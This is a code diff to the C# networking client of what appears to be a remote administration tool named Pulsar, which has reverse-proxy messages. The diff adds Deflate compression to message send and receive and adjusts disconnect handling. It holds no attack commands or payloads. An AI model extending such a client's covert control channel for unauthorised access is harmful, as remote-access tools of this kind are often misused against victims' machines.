@@ -18,6 +18,7 @@ using Pulsar.Common.Messages.Administration.ReverseProxy;
 using System.Diagnostics;
 using System.IO;
 using ProtoBuf;
+using System.IO.Compression;
 
 namespace Pulsar.Client.Networking
 {
@@ -207,12 +208,12 @@ namespace Pulsar.Client.Networking
                 }
                 else
                 {
-                    handle.Dispose();
+                    handle?.Dispose();
                 }
             }
             catch (Exception ex)
             {
-                handle?.Dispose();
+                Disconnect();
                 OnClientFail(ex);
             }
         }
@@ -273,8 +274,9 @@ namespace Pulsar.Client.Networking
                             try
                             {
                                 using (var stream = new MemoryStream(_readBuffer))
+                                using (var deflateStream = new DeflateStream(stream, CompressionMode.Decompress))
                                 {
-                                    var message = Serializer.Deserialize<IMessage>(stream);
+                                    var message = Serializer.Deserialize<IMessage>(deflateStream);
                                     OnClientRead(message, _readBuffer.Length);
                                 }
                             }
@@ -378,11 +380,15 @@ namespace Pulsar.Client.Networking
                 {
                     using (var ms = new MemoryStream())
                     {
-                        Serializer.Serialize(ms, message);
+                        using (var deflateStream = new DeflateStream(ms, CompressionMode.Compress, true))
+                        {
+                            Serializer.Serialize(deflateStream, message);
+                        }
 
-                        var payload = ms.ToArray();
-                        _stream.Write(BitConverter.GetBytes(payload.Length), 0, HEADER_SIZE);
-                        _stream.Write(payload, 0, payload.Length);
+                        var payload = ms.GetBuffer();
+                        var length = (int)ms.Length;
+                        _stream.Write(BitConverter.GetBytes(length), 0, HEADER_SIZE);
+                        _stream.Write(payload, 0, length);
                         _stream.Flush();
                     }
                 }
